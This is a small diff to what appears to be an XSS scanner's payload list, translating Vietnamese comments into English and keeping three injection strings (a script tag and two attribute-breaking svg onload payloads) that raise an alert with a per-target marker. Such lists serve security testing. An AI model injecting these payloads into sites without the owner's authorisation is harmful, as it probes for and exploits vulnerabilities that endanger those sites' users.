@@ -1,5 +1,5 @@
-# Payload XSS proof-of-execution.
-# Scanner sẽ thay FUZZXSS_MARKER bằng marker riêng của từng target.
+# XSS proof-of-execution payloads.
+# Scanner replaces FUZZXSS_MARKER with a per-target marker.
 <script>alert("FUZZXSS_MARKER")</script>
 "><svg/onload=alert("FUZZXSS_MARKER")>
 '><svg/onload=alert("FUZZXSS_MARKER")>
